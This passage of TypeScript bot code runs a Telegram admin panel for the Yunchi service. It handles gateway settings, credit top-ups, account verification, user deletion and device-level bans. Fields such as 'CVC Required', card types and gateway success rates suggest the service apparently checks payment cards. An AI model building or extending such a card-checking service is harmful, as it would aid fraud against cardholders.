✅ <b>CVC Requirement Updated</b>

<b>${escapeHtml(gateway.name)}</b>
CVC Required: ${newValue ? "✅ Yes" : "❌ No"}

<i>Change is now live!</i>
`, {
            inline_keyboard: [
              [{ text: "🔙 Back to Gateway", callback_data: `editgate_select_${gateway.id}` }],
              [{ text: "🔙 Back to Menu", callback_data: "menu_back" }]
            ]
          });
        }
        await answerCallbackQuery(update.callback_query.id, `CVC: ${newValue ? "Required" : "Optional"}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Edit field prompt (store pending edit)
      if (callbackData.startsWith("editgate_field_")) {
        if (!isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Only admins can do this");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const parts = callbackData.replace("editgate_field_", "").split("_");
        const field = parts.pop();
        const gatewayId = parts.join("_");

        const { data: gateway } = await supabase
          .from("gateways")
          .select("id, name")
          .eq("id", gatewayId)
          .single();

        if (!gateway) {
          await answerCallbackQuery(update.callback_query.id, "❌ Gateway not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Store pending edit
        await supabase
          .from("pending_gateway_additions")
          .delete()
          .eq("admin_chat_id", callbackChatId);

        await supabase
          .from("pending_gateway_additions")
          .insert({
            admin_chat_id: callbackChatId,
            step: `edit_${gatewayId}_${field}`,
            gateway_id: gatewayId
          });

        const fieldLabels: Record<string, string> = {
          name: "Display Name",
          code: "Short Code",
          description: "Description",
          card_types: "Card Types",
          speed: "Speed Rating",
          success_rate: "Success Rate",
          charge_amount: "Charge Amount",
          icon_name: "Icon Name",
          icon_color: "Icon Color",
          edge_function_name: "Edge Function",
          display_order: "Display Order"
        };

        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `
━━━━━━━━━━━━━━━━━━━━━━
   ✏️ <b>EDIT: ${fieldLabels[field || ""] || field}</b>
━━━━━━━━━━━━━━━━━━━━━━

Editing <b>${escapeHtml(gateway.name)}</b>

Reply with the new value for <b>${fieldLabels[field || ""] || field}</b>:
`, {
            inline_keyboard: [
              [{ text: "❌ Cancel", callback_data: `editgate_select_${gateway.id}` }]
            ]
          });
        }
        await answerCallbackQuery(update.callback_query.id, `Edit: ${fieldLabels[field || ""] || field}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // REGISTRATION VERIFICATION CALLBACK
      // ─────────────────────────────────────────────────────────
      if (callbackData.startsWith("verify_")) {
        const verificationCode = callbackData.replace("verify_", "");
        console.log(`Processing verification for code: ${verificationCode}`);

        // Validate verification code format (6 alphanumeric characters)
        if (!/^[A-Z0-9]{6}$/.test(verificationCode)) {
          await answerCallbackQuery(update.callback_query.id, "❌ Invalid verification code");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Check if verification exists and is not expired
        const { data: verification, error: fetchError } = await supabase
          .from("pending_verifications")
          .select("id, verified, expires_at, telegram_chat_id")
          .eq("verification_code", verificationCode)
          .single();

        if (fetchError || !verification) {
          console.error("Verification not found:", fetchError);
          await answerCallbackQuery(update.callback_query.id, "❌ Verification code not found or expired");
          if (messageId && callbackChatId) {
            await editTelegramMessage(callbackChatId, messageId, `❌ <b>Verification Failed</b>\n\nThis verification code is invalid or has expired. Please request a new one from the website.`);
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Check if already verified
        if (verification.verified) {
          await answerCallbackQuery(update.callback_query.id, "✅ Already verified!");
          if (messageId && callbackChatId) {
            await editTelegramMessage(callbackChatId, messageId, `✅ <b>Already Verified</b>\n\nYour account has already been verified. Please return to the website to complete your registration.`);
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Check if expired
        const isExpired = new Date(verification.expires_at) < new Date();
        if (isExpired) {
          await answerCallbackQuery(update.callback_query.id, "❌ Verification expired");
          if (messageId && callbackChatId) {
            await editTelegramMessage(callbackChatId, messageId, `❌ <b>Verification Expired</b>\n\nThis verification code has expired. Please request a new one from the website.`);
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Verify that the callback is from the same chat that requested verification
        if (verification.telegram_chat_id !== callbackChatId) {
          await answerCallbackQuery(update.callback_query.id, "❌ Verification mismatch");
          if (messageId && callbackChatId) {
            await editTelegramMessage(callbackChatId, messageId, `❌ <b>Verification Failed</b>\n\nThis verification was requested from a different Telegram account.`);
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Update verification status
        const { error: updateError } = await supabase
          .from("pending_verifications")
          .update({ verified: true })
          .eq("verification_code", verificationCode);

        if (updateError) {
          console.error("Error updating verification:", updateError);
          await answerCallbackQuery(update.callback_query.id, "❌ Verification failed");
          if (messageId && callbackChatId) {
            await editTelegramMessage(callbackChatId, messageId, `❌ <b>Verification Failed</b>\n\nAn error occurred. Please try again.`);
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        console.log(`Verification successful for code: ${verificationCode}`);
        await answerCallbackQuery(update.callback_query.id, "✅ Account verified successfully!");
        
        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `✅ <b>Verification Successful</b>\n\nYour Telegram account has been verified!\n\n🔄 Please return to the website to complete your registration.\n\n<i>This verification will be detected automatically.</i>`);
        }

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Pagination: /allusers (staff can view)
      if (callbackData.startsWith("allusers_page_")) {
        if (!callbackChatId || !isCallbackStaff) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const page = parseInt(callbackData.replace("allusers_page_", ""));
        const perPage = 5;

        const { data: users, count } = await supabase
          .from("profiles")
          .select("user_id, username, credits, telegram_chat_id, is_banned", { count: "exact" })
          .order("created_at", { ascending: false });

        const { data: authData } = await supabase.auth.admin.listUsers();
        const usersWithEmail = users?.map(u => ({
          ...u,
          email: authData?.users?.find((a: any) => a.id === u.user_id)?.email || null
        })) || [];

        const { message, keyboard } = buildUsersListMessage(
          usersWithEmail, page, count || 0,
          usersWithEmail.filter(u => u.telegram_chat_id).length,
          usersWithEmail.filter(u => u.is_banned).length,
          perPage
        );

        if (messageId) await editTelegramMessage(callbackChatId, messageId, message, keyboard || undefined);
        await answerCallbackQuery(update.callback_query.id, `Page ${page + 1}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "allusers_noop") {
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Pagination: /topups
      if (callbackData.startsWith("topups_page_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const page = parseInt(callbackData.replace("topups_page_", ""));
        const { message, keyboard } = await handleTopups(callbackChatId, supabase, page);
        if (messageId && message) await editTelegramMessage(callbackChatId, messageId, message, keyboard || undefined);
        await answerCallbackQuery(update.callback_query.id, `Page ${page + 1}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "topups_noop") {
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "topups_refresh") {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const { message, keyboard } = await handleTopups(callbackChatId, supabase, 0);
        if (messageId && message) await editTelegramMessage(callbackChatId, messageId, message, keyboard || undefined);
        await answerCallbackQuery(update.callback_query.id, "🔄 Refreshed");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Reject all pending topups - confirmation step
      if (callbackData === "topups_reject_all") {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Get pending count for confirmation message
        const { count } = await supabase
          .from("topup_transactions")
          .select("id", { count: "exact", head: true })
          .eq("status", "pending");

        if (!count || count === 0) {
          await answerCallbackQuery(update.callback_query.id, "✅ No pending topups");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const confirmKeyboard = {
          inline_keyboard: [
            [
              { text: `⚠️ Yes, Reject All (${count})`, callback_data: "topups_reject_all_confirm" },
            ],
            [
              { text: "❌ Cancel", callback_data: "topups_refresh" },
            ],
          ],
        };

        if (messageId) {
          await editTelegramMessage(
            callbackChatId, 
            messageId, 
            `⚠️ <b>Reject All Pending Topups?</b>\n\nThis will reject <b>${count}</b> pending topup requests.\n\n<b>All users will be notified.</b>\n\n<i>This action cannot be undone.</i>`,
            confirmKeyboard
          );
        }
        await answerCallbackQuery(update.callback_query.id, "⚠️ Confirmation required");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Reject all - confirmed
      if (callbackData === "topups_reject_all_confirm") {
        if (!callbackChatId || !isCallbackStaff) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        await handleRejectAllTopups(callbackChatId, supabase, messageId);
        await answerCallbackQuery(update.callback_query.id, "🗑️ All rejected");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Topup approve
      if (callbackData.startsWith("topup_accept_")) {
        if (!callbackChatId || !isCallbackStaff) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const transactionId = callbackData.replace("topup_accept_", "");

        // Fetch transaction first (without join since no FK exists)
        const { data: transaction, error: txError } = await supabase
          .from("topup_transactions")
          .select("*")
          .eq("id", transactionId)
          .maybeSingle();

        if (!transaction || txError) {
          console.error("Transaction lookup error:", txError);
          await answerCallbackQuery(update.callback_query.id, "❌ Transaction not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Fetch user profile separately
        const { data: profile } = await supabase
          .from("profiles")
          .select("username, telegram_chat_id")
          .eq("user_id", transaction.user_id)
          .maybeSingle();

        // Get user email for the updated caption
        const { data: authData } = await supabase.auth.admin.listUsers();
        const userAuth = authData?.users?.find((u: any) => u.id === transaction.user_id);
        const userEmail = userAuth?.email || "Unknown";

        // The amount field stores credits directly
        const credits = Number(transaction.amount);
        const username = profile?.username || "Unknown";
        const paymentMethod = transaction.payment_method?.toUpperCase() || "Unknown";
        const timestamp = new Date().toLocaleString("en-US", { 
          month: "short", day: "numeric", year: "numeric", 
          hour: "2-digit", minute: "2-digit" 
        });

        const { data: rpcResult, error: rpcError } = await supabase.rpc("handle_topup_completion", { p_transaction_id: transactionId });
        
        if (rpcError) {
          console.error("RPC error:", rpcError);
          await answerCallbackQuery(update.callback_query.id, "❌ Failed to process approval");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Update the payment proof message - remove buttons and show approved status
        if (messageId && callbackChatId) {
          const approvedCaption = `
✅ <b>APPROVED</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>Transaction ID:</b>
<code>${transactionId}</code>

<b>👤 User:</b> ${username}
<b>📧 Email:</b> ${userEmail}
<b>💵 Amount:</b> ${credits} credits
<b>💳 Method:</b> ${paymentMethod}

━━━━━━━━━━━━━━━━━━━━━━

<b>✅ Status:</b> Approved
<b>📅 Processed:</b> ${timestamp}
`;
          await editMessageCaption(callbackChatId, messageId, approvedCaption, null);
        }

        if (profile?.telegram_chat_id) {
          await sendTelegramMessage(profile.telegram_chat_id, `✅ <b>Topup Approved</b>\n\n+${credits} credits added!`);
        }
        await answerCallbackQuery(update.callback_query.id, `✅ Approved ${credits} credits`);

        // Notify super admin if a moderator took the action
        await notifyAdminOfStaffAction(callbackChatId, "✅ Topup Approved", `<b>User:</b> ${escapeHtml(username)}\n<b>Amount:</b> ${credits} credits`, supabase);

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Topup reject - instantly reject then ask for reason
      if (callbackData.startsWith("topup_reject_") && !callbackData.includes("_reason_") && !callbackData.includes("_cancel_")) {
        if (!callbackChatId || !isCallbackStaff) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const transactionId = callbackData.replace("topup_reject_", "");

        // Fetch transaction
        const { data: transaction } = await supabase
          .from("topup_transactions")
          .select("*")
          .eq("id", transactionId)
          .maybeSingle();

        if (!transaction) {
          await answerCallbackQuery(update.callback_query.id, "❌ Transaction not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // INSTANTLY reject the transaction (no reason yet)
        await supabase.from("topup_transactions").update({ 
          status: "failed"
        }).eq("id", transactionId);

        const { data: profile } = await supabase
          .from("profiles")
          .select("username")
          .eq("user_id", transaction.user_id)
          .maybeSingle();

        const { data: authData } = await supabase.auth.admin.listUsers();
        const userAuth = authData?.users?.find((u: any) => u.id === transaction.user_id);
        const userEmail = userAuth?.email || "Unknown";

        const credits = Number(transaction.amount);
        const username = profile?.username || "Unknown";
        const paymentMethod = transaction.payment_method?.toUpperCase() || "Unknown";
        const timestamp = new Date().toLocaleString("en-US", { 
          month: "short", day: "numeric", year: "numeric", 
          hour: "2-digit", minute: "2-digit" 
        });

        // Update photo caption - remove buttons, mark as rejected
        const rejectedCaption = `
❌ <b>REJECTED</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>Transaction ID:</b>
<code>${transactionId}</code>

<b>👤 User:</b> ${username}
<b>📧 Email:</b> ${userEmail}
<b>💵 Amount:</b> ${credits} credits
<b>💳 Method:</b> ${paymentMethod}
<b>📅 Rejected:</b> ${timestamp}

━━━━━━━━━━━━━━━━━━━━━━
`;

        // Remove buttons from the photo message
        if (messageId && callbackChatId) {
          await editMessageCaption(callbackChatId, messageId, rejectedCaption, null);
        }

        // Send a SEPARATE message asking for the rejection reason
        const reasonKeyboard = {
          inline_keyboard: [
            [{ text: "❌ Invalid payment proof", callback_data: `topup_reject_reason_invalid_${transactionId}` }],
            [{ text: "💰 Amount mismatch", callback_data: `topup_reject_reason_amount_${transactionId}` }],
            [{ text: "⏱️ Payment not received", callback_data: `topup_reject_reason_notreceived_${transactionId}` }],
            [{ text: "🔄 Duplicate submission", callback_data: `topup_reject_reason_duplicate_${transactionId}` }],
            [{ text: "📝 Other reason (type)", callback_data: `topup_reject_reason_other_${transactionId}` }],
          ],
        };

        await sendTelegramMessage(
          callbackChatId,
          `📋 <b>Enter rejection reason</b>\n\n<b>User:</b> ${escapeHtml(username)}\n<b>Amount:</b> ${credits} credits\n\n<i>Select a reason below to notify the user:</i>`,
          reasonKeyboard
        );

        await answerCallbackQuery(update.callback_query.id, "❌ Rejected!");

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Topup reject cancel - no longer needed (already rejected), but handle gracefully
      if (callbackData.startsWith("topup_reject_cancel_")) {
        await answerCallbackQuery(update.callback_query.id, "Transaction already rejected");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Topup reject with "Other" reason - ask for custom reason
      if (callbackData.startsWith("topup_reject_reason_other_")) {
        if (!callbackChatId || !isCallbackStaff) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const transactionId = callbackData.replace("topup_reject_reason_other_", "");

        // Fetch transaction details
        const { data: transaction } = await supabase
          .from("topup_transactions")
          .select("*")
          .eq("id", transactionId)
          .maybeSingle();

        if (!transaction) {
          await answerCallbackQuery(update.callback_query.id, "❌ Transaction not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const { data: profile } = await supabase
          .from("profiles")
          .select("username")
          .eq("user_id", transaction.user_id)
          .maybeSingle();

        // Store pending rejection with custom reason flag using pending_bans table (reusing for simplicity)
        await supabase.from("pending_bans").upsert({
          user_id: transaction.user_id,
          admin_chat_id: callbackChatId,
          username: profile?.username,
          step: `topup_reject_custom_${transactionId}`,
          ban_reason: null
        }, { onConflict: "admin_chat_id" });

        const credits = Number(transaction.amount);

        // Send a separate message asking for custom reason
        await sendTelegramMessage(
          callbackChatId,
          `📝 <b>Enter custom rejection reason</b>\n\n<b>User:</b> ${escapeHtml(profile?.username || "Unknown")}\n<b>Amount:</b> ${credits} credits\n\n<b>Type your rejection reason and send it.</b>\n<i>The reason will be sent to the user.</i>`
        );

        // Remove the reason selection buttons from the previous message
        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `📋 <b>Rejection reason:</b> Custom (typing...)`, { inline_keyboard: [] });
        }
        await answerCallbackQuery(update.callback_query.id, "Enter rejection reason");

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Topup reject with reason - process the rejection
      if (callbackData.startsWith("topup_reject_reason_")) {
        if (!callbackChatId || !isCallbackStaff) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Parse reason and transaction ID
        const parts = callbackData.replace("topup_reject_reason_", "").split("_");
        const reasonCode = parts[0];
        const transactionId = parts.slice(1).join("_");

        // Map reason codes to messages
        const reasonMessages: Record<string, string> = {
          invalid: "Invalid payment proof - image unclear or does not match transaction",
          amount: "Amount mismatch - payment amount does not match requested credits",
          notreceived: "Payment not received - no matching transaction found in our records",
          duplicate: "Duplicate submission - this payment has already been processed",
        };

        const rejectionReason = reasonMessages[reasonCode] || "Rejected by admin";

        // Fetch transaction
        const { data: transaction, error: txError } = await supabase
          .from("topup_transactions")
          .select("*")
          .eq("id", transactionId)
          .maybeSingle();

        if (!transaction || txError) {
          await answerCallbackQuery(update.callback_query.id, "❌ Transaction not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Update transaction with rejection reason (already status=failed from initial reject)
        await supabase.from("topup_transactions").update({ 
          rejection_reason: rejectionReason 
        }).eq("id", transactionId);

        // Fetch user profile
        const { data: profile } = await supabase
          .from("profiles")
          .select("username, telegram_chat_id")
          .eq("user_id", transaction.user_id)
          .maybeSingle();

        const { data: authData } = await supabase.auth.admin.listUsers();
        const userAuth = authData?.users?.find((u: any) => u.id === transaction.user_id);
        const userEmail = userAuth?.email || "Unknown";

        const credits = Number(transaction.amount);
        const username = profile?.username || "Unknown";
        const paymentMethod = transaction.payment_method?.toUpperCase() || "Unknown";
        const timestamp = new Date().toLocaleString("en-US", { 
          month: "short", day: "numeric", year: "numeric", 
          hour: "2-digit", minute: "2-digit" 
        });

        // Update the separate reason message to show the selected reason (remove buttons)
        if (messageId && callbackChatId) {
          await editTelegramMessage(callbackChatId, messageId, `✅ <b>Rejection reason sent:</b> ${rejectionReason}`, { inline_keyboard: [] });
        }

        // Notify user with rejection reason via Telegram
        if (profile?.telegram_chat_id) {
          await sendTelegramMessage(profile.telegram_chat_id, `❌ <b>Topup Rejected</b>\n\n<b>Amount:</b> ${credits} credits\n<b>Reason:</b> ${rejectionReason}\n\nPlease submit a new request with valid payment proof.`);
        }

        // Create website notification for the user
        await supabase.from("notifications").insert({
          user_id: transaction.user_id,
          type: "topup_rejected",
          title: "Top-up Request Rejected",
          message: `Your top-up request for ${credits} credits was rejected. Reason: ${rejectionReason}`,
          metadata: { transaction_id: transactionId, rejection_reason: rejectionReason }
        });

        // Send email notification
        if (userEmail && userEmail !== "Unknown" && RESEND_API_KEY) {
          const emailHtml = `
            <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #0a0a0a;">
              <div style="background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); padding: 30px; text-align: center; border-radius: 16px 16px 0 0;">
                <h1 style="color: white; margin: 0; font-size: 24px;">❌ Top-up Rejected</h1>
              </div>
              <div style="background: #0f0f0f; padding: 30px; border-radius: 0 0 16px 16px; color: #e5e5e5; border: 1px solid #1a1a1a; border-top: none;">
                <p style="color: #e5e5e5; font-size: 16px; line-height: 1.6;">Hello${username && username !== "Unknown" ? ` <strong style="color: #ef4444;">${username}</strong>` : ''},</p>
                
                <p style="color: #a3a3a3; font-size: 16px; line-height: 1.6;">Unfortunately, your top-up request has been rejected.</p>
                
                <div style="background: #1a0a0a; border-left: 4px solid #dc2626; border-radius: 8px; padding: 20px; margin: 25px 0;">
                  <p style="color: #a3a3a3; margin: 5px 0;"><strong style="color: #e5e5e5;">Amount:</strong> ${credits} credits</p>
                  <p style="color: #a3a3a3; margin: 5px 0;"><strong style="color: #e5e5e5;">Payment Method:</strong> ${paymentMethod}</p>
                  <p style="color: #a3a3a3; margin: 5px 0;"><strong style="color: #e5e5e5;">Rejection Reason:</strong></p>
                  <p style="color: #ef4444; font-size: 15px; margin: 10px 0 0 0;">${rejectionReason}</p>
                </div>
                
                <p style="color: #a3a3a3; font-size: 14px; line-height: 1.6;">Please review the rejection reason and submit a new request with valid payment proof if needed.</p>
                
                <div style="text-align: center; margin-top: 25px;">
                  <a href="https://yunchicheck.com/dashboard/topup" style="display: inline-block; background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); color: white; padding: 14px 32px; border-radius: 8px; text-decoration: none; font-weight: bold;">Submit New Request</a>
                </div>
                
                <hr style="border: none; border-top: 1px solid #262626; margin: 30px 0;">
                
                <p style="color: #525252; font-size: 12px; text-align: center;">
                  If you believe this is an error, please contact support.<br>
                  — Yunchi Team
                </p>
              </div>
            </div>
          `;

          try {
            await fetch("https://api.resend.com/emails", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${RESEND_API_KEY}`,
              },
              body: JSON.stringify({
                from: "Yunchi <noreply@yunchicheck.com>",
                reply_to: "support@yunchicheck.com",
                to: [userEmail],
                subject: "❌ Your Top-up Request Was Rejected",
                html: emailHtml,
                headers: { "X-Entity-Ref-ID": crypto.randomUUID() },
              }),
            });
          } catch (emailError) {
            console.error("Failed to send rejection email:", emailError);
          }
        }

        await answerCallbackQuery(update.callback_query.id, "✅ Reason sent to user");

        // Notify super admin if a moderator took the action
        await notifyAdminOfStaffAction(callbackChatId, "❌ Topup Rejected", `<b>User:</b> ${escapeHtml(username)}\n<b>Amount:</b> ${credits} credits\n<b>Reason:</b> ${rejectionReason}`, supabase);

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // User deletion
      if (callbackData.startsWith("delete_confirm_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("delete_confirm_", "");
        const { data: profile } = await supabase.from("profiles").select("username").eq("user_id", userId).maybeSingle();
        const result = await executeUserDeletion(callbackChatId, userId, supabase);

        if (result.success) {
          if (messageId) await editTelegramMessage(callbackChatId, messageId, `✅ Deleted: ${profile?.username || userId}`);
          await answerCallbackQuery(update.callback_query.id, "✅ Deleted");
        } else {
          if (messageId) await editTelegramMessage(callbackChatId, messageId, `❌ Failed: ${result.error}`);
          await answerCallbackQuery(update.callback_query.id, "❌ Failed");
        }
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData.startsWith("delete_cancel_")) {
        if (messageId && callbackChatId) await editTelegramMessage(callbackChatId, messageId, "❌ Deletion cancelled");
        await answerCallbackQuery(update.callback_query.id, "Cancelled");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Delete all users
      if (callbackData === "deleteall_confirm_step1") {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const keyboard = {
          inline_keyboard: [[
            { text: "☠️ FINAL CONFIRM", callback_data: "deleteall_confirm_step2" },
            { text: "❌ Cancel", callback_data: "deleteall_cancel" },
          ]],
        };

        if (messageId) await editTelegramMessage(callbackChatId, messageId, "⚠️ <b>FINAL WARNING</b>\n\nThis will delete ALL users permanently!", keyboard);
        await answerCallbackQuery(update.callback_query.id, "⚠️ Final confirmation required");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "deleteall_confirm_step2") {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        if (messageId) await editTelegramMessage(callbackChatId, messageId, "🔄 Deleting all users...");
        await executeDeleteAllUsers(callbackChatId, supabase);
        await answerCallbackQuery(update.callback_query.id, "✅ Complete");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "deleteall_cancel") {
        if (messageId && callbackChatId) await editTelegramMessage(callbackChatId, messageId, "❌ Cancelled");
        await answerCallbackQuery(update.callback_query.id, "Cancelled");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Ban duration
      if (callbackData.startsWith("ban_duration_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const duration = callbackData.replace("ban_duration_", "");
        const { data: pendingBan } = await supabase.from("pending_bans").select("*").eq("admin_chat_id", callbackChatId).maybeSingle();

        if (!pendingBan) {
          await answerCallbackQuery(update.callback_query.id, "❌ No pending ban");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        let bannedUntil: string | null = null;
        let durationText = "Permanent";
        const isPermanentBan = duration === "permanent";

        if (!isPermanentBan) {
          const hours = parseInt(duration);
          bannedUntil = new Date(Date.now() + hours * 60 * 60 * 1000).toISOString();
          durationText = hours >= 24 ? `${hours / 24} days` : `${hours} hours`;
        }

        await supabase.from("profiles").update({
          is_banned: true,
          ban_reason: pendingBan.ban_reason,
          banned_at: new Date().toISOString(),
          banned_until: bannedUntil
        }).eq("user_id", pendingBan.user_id);

        // For permanent bans, block all known devices and IPs
        if (isPermanentBan) {
          console.log("Permanent ban applied, blocking devices for user:", pendingBan.user_id);
          
          // Get all known devices for this user
          const { data: deviceLogs } = await supabase
            .from("user_device_logs")
            .select("fingerprint, ip_address")
            .eq("user_id", pendingBan.user_id);

          if (deviceLogs && deviceLogs.length > 0) {
            // Create blocked device entries for each unique fingerprint and IP
            const blockedEntries: Array<{
              fingerprint?: string;
              ip_address?: string;
              banned_user_id: string;
              reason: string;
            }> = [];

            const seenFingerprints = new Set<string>();
            const seenIps = new Set<string>();

            for (const log of deviceLogs) {
              if (log.fingerprint && !seenFingerprints.has(log.fingerprint)) {
                seenFingerprints.add(log.fingerprint);
                blockedEntries.push({
                  fingerprint: log.fingerprint,
                  banned_user_id: pendingBan.user_id,
                  reason: pendingBan.ban_reason || "Permanent ban",
                });
              }
              if (log.ip_address && !seenIps.has(log.ip_address)) {
                seenIps.add(log.ip_address);
                blockedEntries.push({
                  ip_address: log.ip_address,
                  banned_user_id: pendingBan.user_id,
                  reason: pendingBan.ban_reason || "Permanent ban",
                });
              }
            }

            if (blockedEntries.length > 0) {
              const { error: blockError } = await supabase
                .from("blocked_devices")
                .insert(blockedEntries);

              if (blockError) {
                console.error("Error blocking devices:", blockError);
              } else {
                console.log(`Blocked ${blockedEntries.length} device/IP entries for user ${pendingBan.user_id}`);
              }
            }
          } else {
            console.log("No device logs found for user:", pendingBan.user_id);
          }
        }

        await supabase.from("pending_bans").delete().eq("admin_chat_id", callbackChatId);

        if (pendingBan.user_telegram_chat_id) {
          await sendTelegramMessage(pendingBan.user_telegram_chat_id, `
🚫 <b>Account Banned</b>

Reason: ${pendingBan.ban_reason || "Not specified"}
Duration: ${durationText}
`);
        }

